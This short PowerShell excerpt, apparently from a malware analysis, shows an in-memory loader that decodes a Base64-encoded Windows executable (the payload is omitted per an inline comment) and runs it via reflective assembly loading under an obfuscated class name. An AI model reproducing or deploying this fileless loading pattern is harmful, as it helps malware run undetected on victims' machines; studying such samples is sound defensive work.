$payload="TVqQAA...AAAA=="^ # The omitted "TVqQAA...AAAA==" is actually a 5387607 character long Base64 string.
$tk=[Convert]::FromBase64String($payload)
[Reflection.Assembly]::Load($tk)
[QJAMsrpfhk.HH]::Main()
